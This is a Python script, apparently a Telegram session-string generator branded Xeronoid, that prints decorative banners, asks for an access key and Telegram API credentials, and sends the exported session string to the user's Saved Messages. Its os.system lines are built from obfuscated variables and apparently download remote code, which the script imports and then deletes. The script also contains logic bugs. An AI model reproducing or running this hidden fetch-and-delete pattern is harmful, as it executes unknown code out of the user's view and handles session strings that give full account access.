import tgcrypto
import sys
import shutil
import asyncio
import time
from pyrogram import Client as dedsec
print("------------------------------------------------------------------------------------")
print("⚓️╔════  Hðw Ärê ¥ðµ ñêw µ§êr ? ════╝⚓️")
time.sleep(2)
USR = input("|    𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝘆𝗼𝘂𝗿 @𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲:\n{𝚙𝚞𝚝 @}:")
if USR.startswith('@'):
   pass
elif USR.startswith != ("@"):
    print("|    ᴅɪᴅ © Xeronoid ᴄᴏᴅᴇ ᴀꜱᴋ ʏᴏᴜ ᴛᴏ ᴘᴜᴛ '@' ᴏʀ ɴᴏᴛ?      ")
    time.sleep(2)
    USR_TEMP = input("|    𝙿𝙻𝙴𝙰𝚂𝙴 𝙿𝚄𝚃 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 𝚆𝙸𝚃𝙷 @:\n      :")
    if USR.startswith != ("@") and USR_TEMP.startswith('@'):
        KUSR = USR_TEMP 
    else: 
        print("|    ᴡᴀꜱ ɪᴛ ꜱᴏ ʜᴀʀᴅ ᴛᴏ ᴜɴᴅᴇʀꜱᴛᴀɴᴅ ꜱɪᴍᴘʟᴇ ᴇɴɢʟɪꜱʜ?")
        print("")
        print("|    𝘊𝘓𝘌𝘈𝘕𝘐𝘕𝘎.. .. .. .. .. .. .. .. .. .. ..")
        sys.exit()
print("|")
print("|")
print("|    ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ ᴡʜɪʟᴇ Xeronoid engine ʙᴏᴏᴛᴜᴘ")
print("|")
print("|")
time.sleep(1)
print("------------------------------------------------------------------------------------")
from termcolor import colored, cprint
print("|")
class booting:
    YBTI = cprint("🥮________𝙱𝚘𝚘𝚝𝚒𝚗𝚐 Ӽɛʀօռօɨɖ 𝙴𝚗𝚐𝚒𝚗𝚎________🥮 ",'yellow',attrs=['bold'], file=sys.stderr)
    GBTI = cprint(" _ )   ___    ___   | |_    (_)   _ _    / _`",'green',attrs=['bold'], file=sys.stderr)
    GBTII = cprint(" _ \  / _ \  / _ \  |  _|   | |  | ' \   \__,",'green',attrs=['bold'], file=sys.stderr)
    GBTIII = cprint("___/  \___/  \___/  _\__|  _|_|_ |_||_|  |__ ",'green',attrs=['bold'], file=sys.stderr)
    YBTII = cprint("🥮________------------------------________🥮 ",'yellow',attrs=['bold'], file=sys.stderr)
print(booting)
time.sleep(3)
from ᏦᎥᏦᏒᎩᎩ import *
print("🛡   Xeronoid engine is now going to download itself.  🛡")
print("🛡                    𝗣𝗹𝗲𝗮𝘀𝗲 𝗵𝗮𝗻𝗴 𝗼𝗻!                🛡")
print("|")
print("|")
print("------------------------------------------------------------------------------------")
from knite import *
import os
os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,KA,HU))
os.system("{} {} {}/{}/{}.{}".format(GT,CL,DT,BA,TA,HU))
print("|")
print("|")
print("------------------------------------------------------------------------------------")
print("|  |   🔥(       (   🔥(      ) 🔥(    (      🔥) (    (   ") 
time.sleep(1)
print("|  |)    ) 🔥(  `   )\ 🔥)    )\🔥 ) )\ ) 🔥*   ) ( /( 🔥*   ")
time.sleep(1)
print("|  |( 🔥/( ( 🔥/( )\🔥))( 🔥(()/(🔥(  ((🔥)/(((🔥)/` )  🔥/( )")
time.sleep(1)
print("|  |)\(🔥)))\(🔥)((_)(🔥)\ /(_🔥))\ 🔥 /(_🔥))/(_)( 🔥)(_)((_🔥")
time.sleep(1)
print("|  |(🔥(_)\🔥((_)\🔥(_()🔥((_🔥(_))🔥((_)🔥(_))🔥(_))🔥(_🔥(_🔥")
time.sleep(1) 
print("=|- 🎧██╗░░██╗███████╗██████╗░░█████╗░███╗░░██╗░█████╗░██╗██████╗░🎧")
time.sleep(1)
print("=|- 🎧╚██╗██╔╝██╔════╝██╔══██╗██╔══██╗████╗░██║██╔══██╗██║██╔══██╗🎧") 
time.sleep(1)
print("=|- 🎧░╚███╔╝░█████╗░░██████╔╝██║░░██║██╔██╗██║██║░░██║██║██║░░██║🎧")
time.sleep(1)
print("=|- 🎧░██╔██╗░██╔══╝░░██╔══██╗██║░░██║██║╚████║██║░░██║██║██║░░██║🎧")
time.sleep(1)
print("=|- 🎧██╔╝╚██╗███████╗██║░░██║╚█████╔╝██║░╚███║╚█████╔╝██║██████╔╝🎧")
time.sleep(1)
print("=|- 🎧╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚════╝░╚═╝╚═════╝░🎧")
time.sleep(1)
print("|")
print("|")
print("|                              ♚ＲＥＡＤＹ♚                     |")
time.sleep(2)
print("|                        🛡Xeronoid  𝘣𝘰𝘰𝘵𝘦𝘥 𝘴𝘶𝘤𝘤𝘦𝘴𝘧𝘶𝘭𝘭𝘺.           |")
print("")
print("------------------------------------------------------------------------------------")
print("|    DO YOU HAVE 𝐗𝐄𝐑𝐎𝐍𝐎𝐈𝐃_𝐊𝐄𝐘🔑?")
FEED = input("|    Press Y for yes and N for No:\n{Y/N}{𝘤𝘢𝘴𝘦 𝘴𝘦𝘯𝘴𝘪𝘵𝘪𝘷𝘦}     :").upper()
if FEED == 'Y' and FEED != 'N':
    pass
else:
    print("           ╔════ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ 𝐗𝐄𝐑𝐎𝐍𝐎𝐈𝐃_𝐊𝐄𝐘 ════╝        ")
    time.sleep(1)
    print("|    ɢᴏ ʙᴀᴄᴋ ᴛᴏ ᴛʜᴇ ɢɪᴛʜᴜʙ ʀᴇᴘᴏ ᴀɴᴅ ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɢᴜɪᴅᴇ")
    time.sleep(1)
    print("|    ᴄᴏᴍᴇ ʙᴀᴄᴋ ᴀɴᴅ ᴇɴᴛᴇʀ ꜱᴇᴛʀɪx ᴋᴇʏ ᴛʜᴀᴛ ʏᴏᴜ ɢᴏᴛ ꜰʀᴏᴍ @ᴋʀʏᴏʟɪ_ʙᴏᴛ")
    print("")
    print("|    𝘊𝘓𝘌𝘈𝘕𝘐𝘕𝘎.. .. .. .. .. .. .. .. .. .. ..")
    print("------------------------------------------------------------------------------------")
    shutil.rmtree(K)
    shutil.rmtree(V)
    shutil.rmtree(P)
    sys.exit()

print("------------------------------------------------------------------------------------")
XERONOIDKEY = input("|    𝗘𝗡𝗧𝗘𝗥 𝗧𝗛𝗘 𝐗𝐄𝐑𝐎𝐍𝐎𝐈𝐃_𝐊𝐄𝐘:\n\n{𝘤𝘢𝘴𝘦 𝘴𝘦𝘯𝘴𝘪𝘵𝘪𝘷𝘦}     :")
print("|            🛡Xeronoid engine 𝗶𝘀 𝗻𝗼𝘄 𝗴𝗼𝗶𝗻𝗴 𝘁𝗼 𝗰𝗵𝗲𝗰𝗸 𝐗𝐄𝐑𝐎𝐍𝐎𝐈𝐃_𝐊𝐄𝐘🔑")
time.sleep(3)
from PPPADADWDKMNCAQWNOPKNQWD import *
if XERONOIDKEY in otoh:
    print("|    ɴᴏᴡ ʙᴏᴏᴛɪɴɢ Xeronoid ꜱᴇꜱꜱɪᴏɴ ᴍᴀᴋᴇʀ")
    time.sleep(2)
    shutil.rmtree(K)
    shutil.rmtree(V)
    shutil.rmtree(P)
else:
    print("------------------------------------------------------------------------------------")
    print("           ╔════ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴠᴀʟɪᴅ 𝐗𝐄𝐑𝐎𝐍𝐎𝐈𝐃_𝐊𝐄𝐘🔑 ════╝        ")
    time.sleep(1)
    print("     ╔════   𝙴𝚇𝙸𝚃𝙸𝙽𝙶 𝚛𝚒𝚐𝚑𝚝 𝚊𝚠𝚊𝚢 ════╝      ")
    print("|    ᴇɴᴛᴇʀ ᴠᴀʟɪᴅ ꜱᴇᴛʀɪx ᴋᴇʏ ᴛʜᴀᴛ ʏᴏᴜ ɢᴏᴛ ꜰʀᴏᴍ @ᴋʀʏᴏʟɪ_ʙᴏᴛ ᴀɴᴅ ʀᴇꜱᴛᴀʀᴛ ᴛʜᴇ ᴘʀᴏᴄᴇꜱꜱ.")
    print("")
    print("|    𝘊𝘓𝘌𝘈𝘕𝘐𝘕𝘎.. .. .. .. .. .. .. .. .. .. ..")
    print("------------------------------------------------------------------------------------")
    shutil.rmtree(K)
    shutil.rmtree(V)
    shutil.rmtree(P)
    sys.exit()
print("------------------------------------------------------------------------------------")
print("𝐗𝐄𝐑𝐎𝐍𝐎𝐈𝐃_𝐊𝐄𝐘🔑 ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟɪᴛᴇᴅ")
print("╔════|===============================================|════╝ ")
APP_ID = int(input("|    ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ᴠᴀʟɪᴅ ᴀᴘᴘ-ɪᴅ ᴛʜᴀᴛ ᴛᴇʟᴇɢʀᴀᴍ ɢᴀᴠᴇ ʏᴏᴜ:\n{𝘤𝘢𝘴𝘦 𝘴𝘦𝘯𝘴𝘪𝘵𝘪𝘷𝘦}     :"))
print("|")
print("|")
time.sleep(1)    
API_HASH = input("|    ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ᴠᴀʟɪᴅ ᴀᴘɪ-ʜᴀꜱʜ ᴛʜᴀᴛ ᴛᴇʟᴇɢʀᴀᴍ ɢᴀᴠᴇ ʏᴏᴜ:\n{𝘤𝘢𝘴𝘦 𝘴𝘦𝘯𝘴𝘪𝘵𝘪𝘷𝘦}      :")
print("|")
print("|")
print("------------------------------------------------------------------------------------")
async def main():
  async with dedsec(
    ":memory:",
    api_id=APP_ID,
    api_hash=API_HASH) as kryo:
    if USR.startswith('@'):
      await kryo.send_photo(
    "me",
    "https://telegra.ph/file/242a5b0104a64c1d7cb84.jpg",
    caption=f"""
🎧♪ｏﾟ♪ﾟ •----『 Wê Ärê H¥þêVðïÐ§ 』----♪ｏﾟ♪ﾟ🎧

ᴀꜱ ʀᴇQᴜᴇꜱᴛᴇᴅ ʙʏ {USR} ʜᴇʀᴇ ɪꜱ ᴛʜᴇ Xeronoid ꜱᴇꜱꜱɪᴏɴ ɴᴀᴍᴇ

一═デ︻ © Xeronoid ︻デ═一"
For any support visit @hypevoids
For more bots and updates visit @hypevoidlab

`@HypeVoidBot ᴛᴏ ᴋɴᴏᴡ ᴜꜱ.
@kryoli_bot ᴛᴏ ɢᴇᴛ ᴋᴇʏ ɴᴇᴇᴅᴇᴅ ꜰᴏʀ ᴛʜᴇ ʙᴏᴛꜱ`
\n\n
"""

f"`{await kryo.export_session_string()}`\n\n🎧♪ｏﾟ♪ﾟ •----『 Wê Ärê H¥þêVðïÐ§ 』----♪ｏﾟ♪ﾟ🎧")
    else:
      await kryo.send_photo(
    "me",
    "https://telegra.ph/file/242a5b0104a64c1d7cb84.jpg",
    caption=f"""
🎧♪ｏﾟ♪ﾟ •----『 Wê Ärê H¥þêVðïÐ§ 』----♪ｏﾟ♪ﾟ🎧

ᴀꜱ ʀᴇQᴜᴇꜱᴛᴇᴅ ʙʏ {KUSR} ʜᴇʀᴇ ɪꜱ ᴛʜᴇ Xeronoid ꜱᴇꜱꜱɪᴏɴ ɴᴀᴍᴇ

一═デ︻ © Xeronoid ︻デ═一"
For any support visit @hypevoids
For more bots and updates visit @hypevoidlab

`@HypeVoidBot ᴛᴏ ᴋɴᴏᴡ ᴜꜱ.
@kryoli_bot ᴛᴏ ɢᴇᴛ ᴋᴇʏ ɴᴇᴇᴅᴇᴅ ꜰᴏʀ ᴛʜᴇ ʙᴏᴛꜱ`
\n\n
"""
f"`{await kryo.export_session_string()}`\n\n🎧♪ｏﾟ♪ﾟ •----『 Wê Ärê H¥þêVðïÐ§ 』----♪ｏﾟ♪ﾟ🎧")

print("------------------------------------------------------------------------------------")
time.sleep(2)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
print("ℕ𝕆𝕎 𝔾𝕆 ℂℍ𝔼ℂ𝕂 𝕐𝕆𝕌ℝ 𝕋𝔼𝕃𝔼𝔾ℝ𝔸𝕄-𝕊𝔸𝕍𝔼𝔻-𝕄𝔼𝕊𝕊𝔸𝔾𝔼 𝕊𝔼ℂ𝕋𝕀𝕆ℕ")